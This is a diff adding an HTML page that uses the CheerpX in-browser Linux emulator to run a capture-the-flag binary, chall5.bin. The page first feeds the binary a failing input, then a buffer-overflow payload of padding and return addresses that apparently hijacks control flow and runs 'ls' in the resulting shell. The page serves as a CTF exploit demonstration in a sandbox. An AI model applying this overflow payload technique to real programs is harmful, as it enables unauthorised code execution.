@@ -1,0 +1,28 @@
+<!doctype html>
+<html lang="en" style="height: 100%;">
+<head>
+    <meta charset="utf-8" />
+    <title>CheerpX Ctf</title>
+    <script type="module">
+      import * as CheerpX from "https://cxrtnc.leaningtech.com/1.0.6/cx.esm.js";
+
+      const webDevice = await CheerpX.WebDevice.create("/ctf");
+      const blockDevice = await CheerpX.CloudDevice.create("wss://disks.webvm.io/debian_large_20230522_5044875331.ext2");
+      const blockCache = await CheerpX.IDBDevice.create("blocks");
+      const overlayDevice = await CheerpX.OverlayDevice.create(blockDevice, blockCache);
+      const mounts = [
+        { type: "ext2", path: "/", dev: overlayDevice },
+        { type: "dir", path: "/ctf", dev: webDevice },
+      ];
+      const cx = await CheerpX.Linux.create({mounts});
+
+      cx.setConsole(document.getElementById("console"));
+      await cx.run("/bin/bash", ["-c", "printf 'an unsuccessful attempt' | /ctf/chall5.bin"]);
+      await cx.run("/bin/bash", ["-c", "printf 'AAAAAAAAAAAAAAAAAAAAAAAAAAAA\\xa0\\x83\\x04\\x08*\\x86\\x04\\x08P\\x86\\x04\\x08\\nls' | /ctf/chall5.bin"]);
+
+    </script>
+  </head>
+  <body>
+    <pre id="console"></pre>
+  </body>
+</html>
